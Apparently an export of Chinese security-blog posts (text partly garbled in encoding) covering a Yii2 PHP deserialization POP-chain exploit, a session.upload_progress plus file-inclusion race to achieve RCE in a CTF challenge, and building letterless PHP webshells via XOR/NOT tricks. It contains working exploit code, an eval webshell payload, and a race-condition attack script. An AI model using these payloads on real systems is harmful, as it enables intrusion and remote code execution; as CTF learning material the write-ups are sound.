<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213827.png" alt=""></p>
<p>ç»§ç»­è·Ÿ<code>normalizer_is_normalized()</code>å‡½æ•°</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008213922.png" alt=""></p>
<p>è·Ÿè¿›é™æ€æ–¹æ³•<code>isNormalized()</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214024.png" alt=""></p>
<p>çœ‹åˆ°<code>preg_match($s)</code>ï¼Œé‚£ä¹ˆ``normalizer_is_normalized()<code>å°±å¯ä»¥ä½œä¸ºè·³æ¿è§¦å‘</code>__toString()`æ–¹æ³•ï¼Œæ¥ä¸‹æ¥åˆå¯ä»¥å’Œä¸Šé¢æåˆ°çš„POPé“¾è¿åœ¨ä¸€èµ·äº†ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Symfony\Component\String\UnicodeString::__wakeup()</span><br><span class="line">-&gt;</span><br><span class="line">phpDocumentor\Reflection\DocBlock\Tags\See::__toString()</span><br><span class="line">-&gt;</span><br><span class="line">Faker\Generator::__call()</span><br><span class="line">-&gt;</span><br><span class="line">yii\rest\IndexAction::run()</span><br></pre></td></tr></table></figure>
<p>EXPï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> $id;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;touch test.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $formatters;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $description;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">UnicodeString</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> $string;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;string = <span class="keyword">new</span> See;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">String</span>\<span class="title">UnicodeString</span>;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> UnicodeString()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æœ‰ä¸ªé—®é¢˜æ˜¯è¿™ä¸ªPOPåˆ©ç”¨é“¾å›æ˜¾çš„æ—¶å€™ä¼šæŠ¥é”™ï¼Œä¸èƒ½æ­£å¸¸æ˜¾ç¤ºã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214536.png" alt=""></p>
<p>ä½†æ˜¯å‘½ä»¤æ˜¯æˆåŠŸæ‰§è¡Œçš„ï¼š</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201008214737.png" style="zoom:50%;" />
<p>è®²é“ç†ï¼Œåº”è¯¥è¿˜å¯ä»¥æ¥ç€æŒ–ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« ">å‚è€ƒæ–‡ç« </h2>
<p><a href="https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg">https://mp.weixin.qq.com/s/Cv2Ax7U1sMtbXCq6YDgkTg</a></p>
<p><a href="https://xz.aliyun.com/t/8307">https://xz.aliyun.com/t/8307</a></p>
<p><a href="https://www.anquanke.com/post/id/217930">https://www.anquanke.com/post/id/217930</a></p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>session.upload_progress+LFIå®ç°RCE</title>
    <url>/Web_security/php_related/13.session.upload_progress+LFI%E5%AE%9E%E7%8E%B0RCE/</url>
    <content><![CDATA[<h1 id="PHP-session-upload-process-LFIå®ç°RCE">PHP session.upload_process + LFIå®ç°RCE</h1>
<blockquote>
<p>å‚è€ƒæ–‡ç« ï¼š</p>
<p><a href="https://tgaout.github.io/2019/05/29/%E5%88%A9%E7%94%A8session-upload-progress%E8%BF%9B%E8%A1%8C%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B8%97%E9%80%8F/">https://tgaout.github.io/2019/05/29/åˆ©ç”¨session-upload-progressè¿›è¡Œæ–‡ä»¶åŒ…å«å’Œååºåˆ—åŒ–æ¸—é€/</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« ä¸»è¦è®°å½•å‚è€ƒæ–‡ç« çš„å¤ç°ç¯èŠ‚ï¼ŒçŸ¥è¯†ç‚¹éƒ¨åˆ†ç®€å•ä»‹ç»ã€‚</p>
<h2 id="0x01-PHPå…³äºupload-processé…ç½®ä»‹ç»">0x01 PHPå…³äºupload_processé…ç½®ä»‹ç»</h2>
<p>æœ¬æ–‡æåˆ°çš„PHPé…ç½®ä¸­å…³äºsession.upload_processä¸»è¦æ˜¯ä¸‹é¢å››ä¸ªï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">session.upload_progress.enabled &#x3D; on</span><br><span class="line">session.upload_progress.cleanup &#x3D; on</span><br><span class="line">session.upload_progress.prefix &#x3D; &quot;upload_progress_&quot;</span><br><span class="line">session.upload_progress.name &#x3D; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>enabled=on</code>è¡¨ç¤ºå½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼ŒPHPä¼šæŠŠæœ¬æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯å­˜å‚¨åœ¨sessionä¸­ï¼›</p>
</li>
<li>
<p><code>cleanup=on</code>è¡¨ç¤ºä¸Šä¼ ç»“æŸåï¼ŒPHPä¼šç«‹å³æ¸…ç©ºå¯¹åº”çš„sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼›</p>
</li>
<li>
<p>å…³äº<code>prefix</code>å’Œ<code>name</code>ä¸¤ä¸ªé€‰é¡¹ï¼ŒPHPæ–‡æ¡£ä¸­æœ‰è¯¦ç»†è¯´æ˜ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018095115.png" alt=""></p>
</li>
</ul>
<h2 id="0x02-upload-progress-æ–‡ä»¶åŒ…å«å®ç°RCE">0x02 upload_progress + æ–‡ä»¶åŒ…å«å®ç°RCE</h2>
<h3 id="ç¤ºä¾‹ä»£ç ">ç¤ºä¾‹ä»£ç </h3>
<p>ç›´æ¥ä»ä¸€é“CTFé¢˜ç›®å…¥æ‰‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 21:20:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">define(<span class="string">&#x27;è¿˜è¦ç§€ï¼Ÿ&#x27;</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">set_include_path(è¿˜è¦ç§€ï¼Ÿ);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    $file = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    $file = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    $file = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, $file);</span><br><span class="line">    <span class="keyword">include</span>($file);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>banæ‰äº†å¸¸è§çš„æ–‡ä»¶åŒ…å«ä¼ªåè®®ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>session.upload_progress</code>å°†æ¶æ„ä»£ç å†™å…¥sessionæ–‡ä»¶ï¼Œä»è€ŒåŒ…å«sessionæ–‡ä»¶ã€‚</p>
<p>ç°åœ¨è¿˜å­˜åœ¨ä¸¤ä¸ªé—®é¢˜ï¼šé¦–å…ˆæ²¡æœ‰ä»£ç ä¸­æ²¡æœ‰<code>session_start()</code>å¦‚ä½•åˆ›å»ºsessionæ–‡ä»¶ï¼›ç¬¬äºŒä¸ªé—®é¢˜ï¼Œç”±äº<code>session.upload_progress.cleanup=on</code>ï¼Œå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œsessionæ–‡ä»¶çš„å†…å®¹è¢«è‡ªåŠ¨æ¸…é™¤ï¼Œå¦‚ä½•è¿›è¡ŒRCEï¼Ÿ</p>
<h3 id="session-use-strict-mode">session.use_strict_mode</h3>
<p>å…³äºç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œsessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é…ç½®ï¼š<code>session.use_strict_mode=0</code>ï¼Œæ„æ€å°±æ˜¯ç”¨æˆ·å¯ä»¥è‡ªå®šä¹‰Session IDã€‚å…·ä½“è€Œè¨€ï¼Œæˆ‘ä»¬åœ¨Cookieä¸­è®¾ç½®<code>Cookie:PHPSESSID=ca01h</code>ï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šsessionå­˜å‚¨çš„ä½ç½®åˆ›å»ºä¸€ä¸ªæ–‡ä»¶<code>session_ca01h</code>ï¼Œå³ä½¿ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œå¹¶ä¸”äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼ç”±<code>session.upload_progress.prefix</code>+<code>session.upload_progress_name</code>ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_æ–‡ä»¶ä¸­ã€‚</p>
<h3 id="æ¡ä»¶ç«äº‰">æ¡ä»¶ç«äº‰</h3>
<p>ä¸ºäº†èµ¶åœ¨sessionæ–‡ä»¶è¢«æ¸…é™¤ä¹‹å‰è¿›è¡ŒRCEï¼Œå¯ä»¥é€šè¿‡ä¸Šä¼ ä¸€ä¸ªå¤§æ–‡ä»¶è¿›è¡Œæ¡ä»¶ç«äº‰ã€‚</p>
<h3 id="è§£é¢˜">è§£é¢˜</h3>
<p>æœ¬æ¥æ˜¯æƒ³ç›´æ¥å†™ä¸€ä¸ªè„šæœ¬Getshellçš„ï¼Œç»“æœä¸€ç›´æ²¡èƒ½è°ƒè¯•å‡ºæ¥ï¼Œåªèƒ½ç”¨burpæŠ“åŒ…intrudeäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;&quot;&quot;http://7a4916f9-18d7-4ecf-bed3-302ed44c5763.chall.ctf.show/index.php&quot;&quot;&quot;</span></span><br><span class="line">sessid = <span class="string">&quot;ca01h&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>: <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>&#125;</span><br><span class="line">proxy = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span>)</span><br><span class="line">        resp = session.post(url=url, data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="string">&quot;&lt;?php eval($_POST);?&gt;&quot;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;ca01h.txt&quot;</span>, f)&#125;, cookies=&#123;<span class="string">&quot;PHPSESSID&quot;</span>: sessid&#125;, proxies=proxy)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(url=url+<span class="string">&quot;?file=/tmp/sess_&quot;</span>+sessid, data=data, proxies=proxy)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;ca01h.txt&quot;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">            print(resp.text)</span><br><span class="line">            event.clear()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;[++++++]Retry&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    event = threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>
<p>burpæŠ“åŒ…</p>
<p>æ–‡ä»¶ä¸Šä¼ è¯·æ±‚åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120147.png" alt=""></p>
<p>æ‰§è¡Œå‘½ä»¤è¯·æ±‚åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120341.png" alt=""></p>
<p>æ¡ä»¶ç«äº‰çˆ†ç ´</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201018120536.png" alt=""></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>webå®‰å…¨å­¦ä¹ </tag>
      </tags>
  </entry>
  <entry>
    <title>PHPæ— æ•°å­—å­—æ¯æ„é€ webshell</title>
    <url>/Web_security/php_related/8.PHP%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E6%9E%84%E9%80%A0webshell/</url>
    <content><![CDATA[<h1 id="PHPæ— æ•°å­—å­—æ¯æ„é€ webshell">PHPæ— æ•°å­—å­—æ¯æ„é€ webshell</h1>
<h2 id="0x01-ä»ä¸€é“é¢˜ç›®å‡ºå‘">0x01 ä»ä¸€é“é¢˜ç›®å‡ºå‘</h2>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;$hint &#x3D;  &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>åˆ†æä»£ç å¯çŸ¥</p>
<ul>
<li>åªè¦æ‰§è¡ŒgetFlag()å‡½æ•°åº”è¯¥å°±å¯ä»¥å¾—åˆ°flagäº†</li>
<li>ä½†å¯¹codeçš„é•¿åº¦é™åˆ¶&lt;40ï¼Œå¹¶ä¸”codeä¸èƒ½æœ‰æ•°å­—å’Œå¤§å°å†™å­—æ¯</li>
</ul>
<h2 id="0x02-å‰ç½®çŸ¥è¯†">0x02 å‰ç½®çŸ¥è¯†</h2>
<h3 id="å¼‚æˆ–è¿ç®—">å¼‚æˆ–è¿ç®—</h3>
<p>åœ¨PHPä¸­ï¼Œä¸¤ä¸ªå˜é‡è¿›è¡Œå¼‚æˆ–æ—¶ï¼Œå…ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆäºŒè¿›åˆ¶å†è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å®Œï¼Œåˆå°†ç»“æœä»äºŒè¿›åˆ¶è½¬æ¢æˆäº†ASCIIå€¼ï¼Œå†å°†ASCIIå€¼è½¬æ¢æˆå­—ç¬¦ä¸²ã€‚</p>
<p>ä¸¾ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Açš„ASCIIå€¼æ˜¯65ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯01000001</span><br><span class="line">&#96;?çš„ASCIIå€¼æ˜¯63ï¼Œå¯¹åº”çš„äºŒè¿›åˆ¶å€¼æ˜¯00111111</span><br></pre></td></tr></table></figure>
<p>å¼‚æˆ–çš„äºŒè¿›åˆ¶çš„å€¼æ˜¯<code>01111110</code>ï¼Œå¯¹åº”çš„ASCIIå€¼æ˜¯126ï¼Œå¯¹åº”çš„å­—ç¬¦ä¸²çš„å€¼å°±æ˜¯<code>~</code>äº†ã€‚</p>
<p>å†ç»“åˆPHPå¼±ç±»å‹çš„ç‰¹ç‚¹ï¼Œå¯ä»¥å°†æ•´å‹è½¬æ¢æˆå­—ç¬¦ä¸²å‹ï¼Œå°†å¸ƒå°”å‹å½“ä½œæ•´å‹ï¼Œæˆ–è€…å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼Œä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€æ®µä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    function B()&#123;</span><br><span class="line">        echo &quot;Hello Angel_Kitty&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $_++;</span><br><span class="line">    $__&#x3D; &quot;?&quot; ^ &quot;&#125;&quot;;</span><br><span class="line">    $__();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>ç¬¬5è¡Œä»£ç å¯¹å˜é‡åä¸º<code>_</code>çš„å˜é‡è¿›è¡Œè‡ªå¢æ“ä½œï¼Œåœ¨PHPä¸­æœªå®šä¹‰çš„å˜é‡é»˜è®¤å€¼ä¸ºnullï¼ˆnullfalse0ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸ä½¿ç”¨ä»»ä½•æ•°å­—çš„æƒ…å†µä¸‹,é€šè¿‡å¯¹æœªå®šä¹‰å˜é‡çš„è‡ªå¢æ“ä½œæ¥å¾—åˆ°ä¸€ä¸ªæ•°å­—ã€‚</p>
<p>ç¬¬6è¡Œä»£ç å¯¹å­—ç¬¦<code>?</code>å’Œ<code>&#125;</code>è¿›è¡Œå¼‚æˆ–æ“ä½œï¼Œå¾—åˆ°å­—ç¬¦<code>B</code>èµ‹å€¼ç»™å˜é‡åä¸º<code>__</code>çš„å˜é‡ã€‚</p>
<p>ç¬¬7è¡Œä»£ç å¯ä»¥çœ‹ä½œæ˜¯æ‰§è¡Œ<code>B()</code>ï¼Œè¡¨ç¤ºè°ƒç”¨å‡½æ•°B,æ‰€ä»¥æ‰§è¡Œç»“æœä¸º<code>Hello Angel_Kitty</code>ã€‚</p>
<p>å†çœ‹ä¸€ä¸ªéæ•°å­—å­—æ¯çš„PHPåé—¨ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; demo1.php</span><br><span class="line">&lt;?php</span><br><span class="line">    @$_++; &#x2F;&#x2F; $_ &#x3D; 1</span><br><span class="line">    $__&#x3D;(&quot;#&quot;^&quot;|&quot;); &#x2F;&#x2F; $__ &#x3D; _</span><br><span class="line">    $__.&#x3D;(&quot;.&quot;^&quot;~&quot;); &#x2F;&#x2F; _P</span><br><span class="line">    $__.&#x3D;(&quot;&#x2F;&quot;^&quot;&#96;&quot;); &#x2F;&#x2F; _PO</span><br><span class="line">    $__.&#x3D;(&quot;|&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POS</span><br><span class="line">    $__.&#x3D;(&quot;&#123;&quot;^&quot;&#x2F;&quot;); &#x2F;&#x2F; _POST </span><br><span class="line">    $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); &#x2F;&#x2F; $_POST[0]($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200510130021.png" alt=""></p>
<p><code>_POST</code>çš„æ‹¼æ¥å¯ä»¥å°†ä¸Šé¢çš„ä»£ç åˆå¹¶ä¸ºä¸€è¡Œï¼Œä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$__&#x3D;(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;&#x2F;&quot;^&quot;&#96;&quot;).(&quot;|&quot;^&quot;&#x2F;&quot;).(&quot;&#123;&quot;^&quot;&#x2F;&quot;);</span><br></pre></td></tr></table></figure>
<p>è¿˜å¯ä»¥ç”¨æ›´çŸ­çš„å­—ç¬¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&quot;&#96;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;&#x2F;&quot; &#x2F;&#x2F;_GET</span><br><span class="line">&quot;#.&#x2F;|&#123;&quot;^&quot;|~&#96;&#x2F;&#x2F;&quot; &#x2F;&#x2F;_POST</span><br></pre></td></tr></table></figure>
<h3 id="å–åè¿ç®—">å–åè¿ç®—</h3>
<p>æ¥çœ‹ä¸€ä¸ªæ±‰å­—&quot;å’Œ&quot;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;))</span><br><span class="line">b&#39;\xe5\x92\x8c&#39;</span><br><span class="line">&gt;&gt;&gt; print(&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">140</span><br><span class="line">&gt;&gt;&gt; print(~&quot;å’Œ&quot;.encode(&#39;utf8&#39;)[2])</span><br><span class="line">-141</span><br></pre></td></tr></table></figure>
<p><code>å’Œ</code>çš„ç¬¬ä¸‰ä¸ªå­—èŠ‚çš„å€¼ä¸º140[0x8c]ï¼Œå–åçš„å€¼ä¸º-141ã€‚<br>
è´Ÿæ•°ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºï¼Œé€šå¸¸ç”¨çš„æ˜¯è¡¥ç çš„æ–¹å¼è¡¨ç¤ºã€‚è´Ÿæ•°çš„è¡¥ç æ˜¯å®ƒæœ¬èº«çš„å€¼æ¯ä½æ±‚å,æœ€åå†åŠ ä¸€ã€‚141çš„16è¿›åˆ¶ä¸º<code>0xff73</code>ï¼Œphpä¸­<code>chr(0xff73)</code>==115ï¼Œ115å°±æ˜¯sçš„ASCIIå€¼ã€‚<br>
å› æ­¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$_&#x3D;&quot;å’Œ&quot;;</span><br><span class="line">print(~($_&#123;2&#125;));</span><br><span class="line">print(~&quot;\x8c&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸¤ä¸ªå†™æ³•æ€§è´¨ä¸€æ ·ï¼Œç»“æœä¼šè¾“å‡ºï¼š<code>ss</code></p>
<p>è„šæœ¬ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; def get(shell):</span><br><span class="line">...     hexbit&#x3D;&#39;&#39;.join(map(lambda x: hex(~(-(256-ord(x)))),shell))</span><br><span class="line">...     print(hexbit)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; get(&#39;phpinfo&#39;)</span><br><span class="line">0x8f0x970x8f0x960x910x990x90</span><br></pre></td></tr></table></figure>
<h3 id="ä¸ç”¨æ•°å­—æ„é€ æ•°å­—">ä¸ç”¨æ•°å­—æ„é€ æ•°å­—</h3>
<p>ä¸»è¦æ€æƒ³å°±æ˜¯ï¼Œåˆ©ç”¨äº†PHPå¼±ç±»å‹ç‰¹æ€§ï¼Œtrueçš„å€¼ä¸º1ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_&#x3D;(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)+(&#39;&gt;&#39;&gt;&#39;&lt;&#39;)</span><br><span class="line">print($_) &#x2F;&#x2F; 1</span><br><span class="line">print($_&#x2F;$_) &#x2F;&#x2F; 2</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å­—ç¬¦<code>&gt;</code>çš„asciiå€¼å¤§äº<code>&lt;</code>asciiçš„å€¼</p>
</blockquote>
